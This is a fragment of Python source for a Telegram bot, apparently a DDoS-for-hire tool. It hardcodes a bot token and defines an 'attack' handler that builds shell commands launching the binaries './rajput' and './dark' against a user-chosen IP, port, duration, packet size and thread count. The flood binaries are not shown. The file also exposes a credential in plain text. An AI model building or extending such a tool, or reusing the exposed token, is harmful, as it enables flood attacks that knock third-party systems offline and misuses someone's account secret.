...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '6858504214:AAHXUrJMZt7_mOb48SxCzkJzm8GyoubZXaU'
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./rajput {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./rajput {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./dark {ip} {port} {duration} {byte_size} {threads}"
